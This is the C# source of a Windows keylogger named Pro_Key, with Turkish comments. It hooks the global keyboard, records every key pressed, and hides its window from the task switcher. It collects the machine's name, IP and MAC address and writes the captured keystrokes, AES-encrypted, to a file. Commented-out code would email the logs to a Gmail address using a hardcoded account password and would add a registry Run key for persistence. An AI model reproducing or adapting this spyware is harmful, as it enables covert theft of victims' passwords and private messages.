﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Net;
using System.Management;
using System.Net.NetworkInformation;//mac adresini almak için
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;//Tutulan log ları(kayıtları) mail ile gönderecegim için bu kütüphaneyi dahil ediyorum.
using System.Runtime.InteropServices;
using Microsoft.Win32;//Projeyı calıstırdıgımız bilgiisayarda bilgisayar kapattıgında kapatılıp açıldıgındaprojenin tekrar çalışması için
using HootKeys;//Class1 cagırıyorum.
namespace Pro_Key
{
    public partial class Form1 : Form
    {

        public Form1()
        {
            InitializeComponent();      
            TuslariDinle();
        }
        Class2 a_e_S_gon = new Class2();
        filerw f = new filerw();


        //task manager görünmemesi için
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;  // Turn on WS_EX_TOOLWINDOW
                return cp;
            }
        }

        //capslock için
        [DllImport("user32.dll")]
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        const int KEYEVENTF_EXTENDEDKEY = 0x1;
        const int KEYEVENTF_KEYUP = 0x2;
        //-------------------
        globalKeyboardHook klavye = new globalKeyboardHook();
        private string pas = "A.alper123";
        int number = 0;
        string log = "";
        bool BigChar = true;//capclock acık kapalı
   
        private string IPgonder()
        {
            try
            {
                string bilgisayaradi = Dns.GetHostName();

                string ipAdresi = Dns.GetHostByName(bilgisayaradi).AddressList[0].ToString();
                //birden fazla ip olabilceğinden burada ilk bulunanı alıyoruz.
                //MessageBox.Show(bilgisayaradi + ipAdresi);
                return bilgisayaradi + " " + ipAdresi;
            }
            catch
            {
                return null;
            }
           
            
        }
        public string Mac()
        {
            //public string MACAdresiAl()
            //{
            //    NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            //    String sMacAddress = string.Empty;
            //    foreach (NetworkInterface adapter in nics)
            //    {
            //        if (sMacAddress == String.Empty) sMacAddress = adapter.GetPhysicalAddress().ToString();
            //        //textBox1.Text = (sMacAddress);
            //    }
            //    return sMacAddress;

            //}
            try
            {
                String macadress = string.Empty;
                string mac = null;
                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    OperationalStatus ot = nic.OperationalStatus;
                    if (nic.OperationalStatus == OperationalStatus.Up)
                    {
                        macadress = nic.GetPhysicalAddress().ToString();
                        break;
                    }
                }
                for (int i = 0; i <= macadress.Length - 1; i++)
                {
                    mac = mac + ":" + macadress.Substring(i, 2);
                    // mac adresini alırken parça parça aldığından 
                    //aralarına : işaretini biz atıyoruz.
                    i++;
                }
                mac = mac.Remove(0, 1);
                // en sonda kalan fazladan : işaretini siliyoruz.
                //MessageBox.Show(mac);
                return mac;
            }
            catch
            {
                return null;
            }
        }
        void TuslariDinle()
        {
            //HARFLER
            klavye.HookedKeys.Add(Keys.A);
            klavye.HookedKeys.Add(Keys.S);
            klavye.HookedKeys.Add(Keys.D);
            klavye.HookedKeys.Add(Keys.F);
            klavye.HookedKeys.Add(Keys.G);
            klavye.HookedKeys.Add(Keys.H);
            klavye.HookedKeys.Add(Keys.J);
            klavye.HookedKeys.Add(Keys.K);
            klavye.HookedKeys.Add(Keys.L);
            klavye.HookedKeys.Add(Keys.Z);
            klavye.HookedKeys.Add(Keys.X);
            klavye.HookedKeys.Add(Keys.C);
            klavye.HookedKeys.Add(Keys.V);
            klavye.HookedKeys.Add(Keys.B);
            klavye.HookedKeys.Add(Keys.N);
            klavye.HookedKeys.Add(Keys.M);
            klavye.HookedKeys.Add(Keys.Q);
            klavye.HookedKeys.Add(Keys.W);
            klavye.HookedKeys.Add(Keys.E);
            klavye.HookedKeys.Add(Keys.R);
            klavye.HookedKeys.Add(Keys.T);
            klavye.HookedKeys.Add(Keys.Y);
            klavye.HookedKeys.Add(Keys.U);
            
            klavye.HookedKeys.Add(Keys.I);
            klavye.HookedKeys.Add(Keys.O);
            klavye.HookedKeys.Add(Keys.P);

            //Türkçe Karekterler  //HARFLER

            klavye.HookedKeys.Add(Keys.OemOpenBrackets);//ğ
            klavye.HookedKeys.Add(Keys.Oem6);//ü
            klavye.HookedKeys.Add(Keys.Oem1);//ş
            klavye.HookedKeys.Add(Keys.Oem7);//i
            klavye.HookedKeys.Add(Keys.OemQuestion);//ö
            klavye.HookedKeys.Add(Keys.Oem5);//ç

            klavye.HookedKeys.Add(Keys.OemMinus);//- sıfınr yanındaki
            klavye.HookedKeys.Add(Keys.Oem3);//"           
            klavye.HookedKeys.Add(Keys.Oem8);//* sıfırın yanındaki



            //Rakamlar

            klavye.HookedKeys.Add(Keys.NumPad0);
            klavye.HookedKeys.Add(Keys.NumPad1);
            klavye.HookedKeys.Add(Keys.NumPad2);
            klavye.HookedKeys.Add(Keys.NumPad3);
            klavye.HookedKeys.Add(Keys.NumPad4);
            klavye.HookedKeys.Add(Keys.NumPad5);
            klavye.HookedKeys.Add(Keys.NumPad6);
            klavye.HookedKeys.Add(Keys.NumPad7);
            klavye.HookedKeys.Add(Keys.NumPad8);
            klavye.HookedKeys.Add(Keys.NumPad9);

            //Üst Rakamlar

            klavye.HookedKeys.Add(Keys.D0);
            klavye.HookedKeys.Add(Keys.D1);
            klavye.HookedKeys.Add(Keys.D2);
            klavye.HookedKeys.Add(Keys.D3);
            klavye.HookedKeys.Add(Keys.D4);
            klavye.HookedKeys.Add(Keys.D5);
            klavye.HookedKeys.Add(Keys.D6);
            klavye.HookedKeys.Add(Keys.D7);
            klavye.HookedKeys.Add(Keys.D8);
            klavye.HookedKeys.Add(Keys.D9);

            //nokta , backspace vs
            klavye.HookedKeys.Add(Keys.OemPeriod);//NOKTA
            klavye.HookedKeys.Add(Keys.Back);//BACKSPACE            
            klavye.HookedKeys.Add(Keys.Space);//BOŞLUK
            klavye.HookedKeys.Add(Keys.Enter);
            klavye.HookedKeys.Add(Keys.LShiftKey);//shift tuşu
            klavye.HookedKeys.Add(Keys.RShiftKey);//shift tuşu            
            klavye.HookedKeys.Add(Keys.RMenu);//SAG ALT GR            
            klavye.HookedKeys.Add(Keys.CapsLock);
            klavye.HookedKeys.Add(Keys.Divide);//böl tuşu
            klavye.HookedKeys.Add(Keys.Oemcomma);//, tuşu
            klavye.HookedKeys.Add(Keys.OemBackslash);//kücüktür büyüktür tuşu
            klavye.HookedKeys.Add(Keys.Subtract);//, tuşu
            klavye.HookedKeys.Add(Keys.Add);//+ tuşu
            klavye.HookedKeys.Add(Keys.Multiply);//* tuşu

           

            

            klavye.KeyDown += new KeyEventHandler(TusKombinasyonu);
            //klavye.KeyUp += new KeyEventHandler(TusKombinasyonu2);

            //KeyDown:Tuşa basıldıgı an çalışır.Basılmaya devam edilir
            //KeyPress:Tuşa basılıp tuştan çekildiği an çalışan eventdir.
            //KeyUp:Elinizi tuştan çektiğinizde çalışır.
        }
        void Mail()
        {
            try
            {
                //MailMessage msj = new MailMessage();
                //SmtpClient istemci = new SmtpClient();//Simple mail transfre protocolo elektronık posta gönderme protokolu
                //                                      //sunucuyla istemci arasında
                //istemci.Credentials = new System.Net.NetworkCredential("alpersahinoner@outlook.com", pas);//bu hesaptan göndericem.
                //istemci.Port = 587;
                //istemci.Host = "smtp.live.com";//smtp.gmail.com
                //istemci.EnableSsl = true;//sunucu ile istemci arasında veir gönderilene dogru adrese gönderene kadar sifreleme yaparka kimsenın gormememsi saglanır
                //                         //security socket layer //güvenlik yuva katmanı


                //msj.To.Add("keylogalper@gmail.com");//mail nereye gidecek ?
                //msj.From = new MailAddress("alpersahinoner@outlook.com");///bu adresten gönderilecek

                //msj.Subject = "#Log " + IPgonder() + " " + Mac();
                //msj.Body = log.ToString();
                //istemci.Send(msj);

                f.dosyayazdiroku(a_e_S_gon.AESsifrele(log.ToString()));
                log = "";
                number = 0;

            }
            catch
            {
                //Mail gelmezse veya internete baglı degıl sorun yasanırsa txt dosyasına yazdıracak
                //Çalışması
                //log dosyası önce aes ile şifrelenecek
                //şifreli gelen string deger dosyanın satırına yazılacak satır satır

                //f.dosyayazdiroku(a_e_S_gon.AESsifrele(log.ToString()));
                //log = "";
                //number = 0;
                //MessageBox.Show(a_e_S_gon.AESsifrele(log.ToString()));

            }
        }
        void TusKombinasyonu(object sender,KeyEventArgs e)
        {
            if (number > 75)//basılan tuş 75 den fazla oldugunda
            {
                
                Mail();
                number = 0;//her karaktern girildııgden sayac olusuturuyorum sonra bunu kontrol ederek  mail gondericiem
                log = "";//bilgisayarda girilen bilgilerin tutuldugu yer log dur
            }

            if (e.KeyCode == Keys.CapsLock)//capslock basıldıgında
            {
                if (BigChar == true)//acıkise
                    BigChar = false;
                else//kapalı ise yani false ise
                    BigChar = true;
            }
            //nokta , backspace vs
            if (e.KeyCode == Keys.Oem3)//çift tırnak
            {
                log += "\"";
                number++;
            }
            if (e.KeyCode == Keys.Oem8)//sıfırın yanındaki tuş
            {
                log += "*";
                number++;
            }
            if (e.KeyCode == Keys.OemPeriod)
            {
                log += ".";
                number++;
            }
            if (e.KeyCode == Keys.Back)
            {

                log += "<BSPACE>";
                number++;//her karakter giiridlginde sayac arıtıracagım ve ilerde mesela 100 karakterden sonra mail gönder şeklinde
                         //    //bir kontrol için sayac eklıyorum
            }
            
            if (e.KeyCode==Keys.RMenu)
            {
                log += "<RALT>";
                number++;

            }
            if (e.KeyCode == Keys.RShiftKey)
            {
                log += "<RSHIFT>";
                number++;
            }
            if (e.KeyCode == Keys.LShiftKey)
            {
                log += "<LSHIFT>";
                number++;
            }
            if (e.KeyCode == Keys.OemMinus)//çift tırnak
            {
                log += "-";
                number++;
            }
            if (e.KeyCode == Keys.Divide)//böl tuşu
            {
                log += "/";
                number++;
            }
            if (e.KeyCode == Keys.Oemcomma)//virgul tuşu
            {
                log += ",";
                number++;
            }

            if (e.KeyCode == Keys.Multiply)//* tuşu
            {
                log += "*";
                number++;
            }
            if (e.KeyCode == Keys.Subtract)//- tuşu
            {
                log += "-";
                number++;
            }
            if (e.KeyCode == Keys.Add)//+ tuşu
            {
                log += "+";
                number++;
            }
            if (e.KeyCode == Keys.OemBackslash)//kücüktür büyüktür tuşu
            {
                log += "<>";
                number++;
            }
          
            //Rakamlar
            if (e.KeyCode == Keys.NumPad0 || e.KeyCode == Keys.D0)
            {

                log += "0";
                number++;
            }
            if (e.KeyCode == Keys.NumPad1 || e.KeyCode == Keys.D1)
            {

                log += "1";
                number++;
            }
            if (e.KeyCode == Keys.NumPad2 || e.KeyCode == Keys.D2)
            {

                log += "2";
                number++;
            }
            if (e.KeyCode == Keys.NumPad3 || e.KeyCode == Keys.D3)
            {

                log += "3";
                number++;
            }
            if (e.KeyCode == Keys.NumPad4 || e.KeyCode == Keys.D4)
            {

                log += "4";
                number++;
            }
            if (e.KeyCode == Keys.NumPad5 || e.KeyCode == Keys.D5)
            {

                log += "5";
                number++;
            }
            if (e.KeyCode == Keys.NumPad6 || e.KeyCode == Keys.D6)
            {

                log += "6";
                number++;
            }
            if (e.KeyCode == Keys.NumPad7 || e.KeyCode == Keys.D7)
            {

                log += "7";
                number++;
            }
            if (e.KeyCode == Keys.NumPad8 || e.KeyCode == Keys.D8)
            {

                log += "8";
                number++;
            }
            if (e.KeyCode == Keys.NumPad9 || e.KeyCode == Keys.D9)
            {

                log += "9";
                number++;
            }



            //Türkçe Karekterler

            if (e.KeyCode == Keys.OemOpenBrackets)
            {
                if (BigChar == true)
                    log += "Ğ";
                else
                    log += "ğ";

                number++;
            }
            if (e.KeyCode == Keys.Oem6)
            {
                if (BigChar == true)
                    log += "Ü";
                else
                    log += "ü";

                number++;
            }
            if (e.KeyCode == Keys.Oem1)
            {
                if (BigChar == true)
                    log += "Ş";
                else
                    log += "ş";

                number++;
            }
            if (e.KeyCode == Keys.Oem7)
            {
                if (BigChar == true)
                    log += "İ";
                else
                    log += "i";

                number++;
            }
            if (e.KeyCode == Keys.OemQuestion)
            {
                if (BigChar == true)
                    log += "Ö";
                else
                    log += "ö";

                number++;
            }
            if (e.KeyCode == Keys.Oem5)
            {
                if (BigChar == true)
                    log += "Ç";
                else
                    log += "ç";

                number++;
            }




            //ENTER BACKSPACE VS

            if (e.KeyCode == Keys.Enter)
            {
                log += "<ENTER>";
                number++;
            }
            if (e.KeyCode == Keys.Space)
            {
                log += "<SPACE>";
                number++;
            }

            //Diğer Karekterler


            if (e.KeyCode == Keys.A)
            {
                if (BigChar == true)
                    log += "A";
                else
                    log += "a";

                number++;
            }
            if (e.KeyCode == Keys.S)
            {
                if (BigChar == true)
                    log += "S";
                else
                    log += "s";

                number++;
            }
            if (e.KeyCode == Keys.D)
            {
                if (BigChar == true)
                    log += "D";
                else
                    log += "d";

                number++;
            }
            if (e.KeyCode == Keys.F)
            {

                if (BigChar == true)
                    log += "F";
                else
                    log += "f";

                number++;
            }
            if (e.KeyCode == Keys.G)
            {

                if (BigChar == true)
                    log += "G";
                else
                    log += "g";

                number++;
            }
            if (e.KeyCode == Keys.H)
            {

                if (BigChar == true)
                    log += "H";
                else
                    log += "h";

                number++;
            }
            if (e.KeyCode == Keys.J)
            {

                if (BigChar == true)
                    log += "J";
                else
                    log += "j";

                number++;
            }
            if (e.KeyCode == Keys.K)
            {

                if (BigChar == true)
                    log += "K";
                else
                    log += "k";

                number++;

            }
            if (e.KeyCode == Keys.L)
            {

                if (BigChar == true)
                    log += "L";
                else
                    log += "l";

                number++;
            }
            if (e.KeyCode == Keys.Z)
            {

                if (BigChar == true)
                    log += "Z";
                else
                    log += "z";

                number++;
            }
            if (e.KeyCode == Keys.X)
            {

                if (BigChar == true)
                    log += "X";
                else
                    log += "x";

                number++;
            }
            if (e.KeyCode == Keys.C)
            {

                if (BigChar == true)
                    log += "C";
                else
                    log += "c";

                number++;
            }
            if (e.KeyCode == Keys.V)
            {

                if (BigChar == true)
                    log += "V";
                else
                    log += "v";

                number++;
            }
            if (e.KeyCode == Keys.B)
            {

                if (BigChar == true)
                    log += "B";
                else
                    log += "b";

                number++;
            }
            if (e.KeyCode == Keys.N)
            {

                if (BigChar == true)
                    log += "N";
                else
                    log += "n";

                number++;
            }
            if (e.KeyCode == Keys.M)
            {

                if (BigChar == true)
                    log += "M";
                else
                    log += "m";

                number++;

            }
            if (e.KeyCode == Keys.Q)
            {

                if (BigChar == true)
                    log += "Q";
                else
                    log += "q";

                number++;
            }
            if (e.KeyCode == Keys.W)
            {

                if (BigChar == true)
                    log += "W";
                else
                    log += "w";

                number++;
            }
            if (e.KeyCode == Keys.E)
            {

                if (BigChar == true)
                    log += "E";
                else
                    log += "e";

                number++;
            }
            if (e.KeyCode == Keys.R)
            {

                if (BigChar == true)
                    log += "R";
                else
                    log += "r";

                number++;
            }
            if (e.KeyCode == Keys.T)
            {

                if (BigChar == true)
                    log += "T";
                else
                    log += "t";

                number++;
            }
            if (e.KeyCode == Keys.Y)
            {

                if (BigChar == true)
                    log += "Y";
                else
                    log += "y";

                number++;
            }
            if (e.KeyCode == Keys.U)
            {

                if (BigChar == true)
                    log += "U";
                else
                    log += "u";

                number++;
            }
            if (e.KeyCode == Keys.I)
            {

                if (BigChar == true)
                    log += "I";
                else
                    log += "ı";

                number++;
            }
            if (e.KeyCode == Keys.O)
            {

                if (BigChar == true)
                    log += "O";
                else
                    log += "o";

                number++;
            }
            if (e.KeyCode == Keys.P)
            {

                if (BigChar == true)
                    log += "P";
                else
                    log += "p";

                number++;
            }
        }
       
     

        private void Form1_Load(object sender, EventArgs e)
        {
            
            //MessageBox.Show(Mac()+ IPgonder());
            /*KeyPreview = true;*///Arka planda bile tuşu algılayıp atadıgımız işlemi gerçekleştrimek için
            //Form yükldengııdne caps lockun acık olup olmadııgnı yakalamam lazım
            if (Control.IsKeyLocked(Keys.CapsLock))
            {
                //Capslock açıksa ilk baştaki değeri ne olsun
                BigChar = true; /*this.Text = "Caps lock acik";*/

            }
            else//capslock kapalıysa
            {
                BigChar = false; /*this.Text = "Caps LOCK kapalı";*/
            }


            //Programın başlangıcta calısması için
            //RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            //key.SetValue("Pro_Key", "\"" + Application.ExecutablePath + "\"");

            //Regeditten açılışta çalıştırılacaklardan kaldır
            //RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            //key.DeleteValue("Pro_Key");
        }

      
    }
}
